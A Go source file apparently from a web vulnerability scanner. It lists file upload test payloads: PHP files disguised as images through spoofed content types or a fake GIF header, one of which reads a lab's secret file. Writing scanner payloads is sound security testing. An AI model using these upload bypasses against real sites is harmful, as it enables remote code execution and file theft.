package payloads

// FileUploadTest represents a single test case for the file upload scanner.
type FileUploadTest struct {
	FileName    string
	Content     []byte
	ContentType string
	Description string
}

// FileUploadTests contains a list of test cases for file upload vulnerabilities.
var FileUploadTests = []FileUploadTest{
	{
		FileName:    "magic.php",
		Content:     []byte("GIF89a;" + "<?php echo 'dursgo_magic_header'; ?>"),
		ContentType: "image/gif",
		Description: "PHP file with a fake GIF magic header to bypass content validation.",
	},
	{
		FileName:    "exploit.php",
		Content:     []byte("<?php echo file_get_contents('/home/carlos/secret'); ?>"),
		ContentType: "image/jpeg", // Spoofing as an image
		Description: "PHP file disguised as a JPEG to bypass content-type checks for the lab.",
	},
	{
		FileName:    "test.php",
		Content:     []byte("<?php echo 'dursgo_secret'; ?>"),
		ContentType: "image/jpeg", // Spoofing as an image
		Description: "PHP file disguised as a JPEG to bypass content-type checks.",
	},
	{
		FileName:    "test.phtml",
		Content:     []byte("<?php echo 'dursgo_secret'; ?>"),
		ContentType: "image/png",
		Description: "PHTML file disguised as a PNG.",
	},
	{
		FileName:    "test.php5",
		Content:     []byte("<?php echo 'dursgo_secret'; ?>"),
		ContentType: "image/gif",
		Description: "PHP5 file disguised as a GIF.",
	},
}
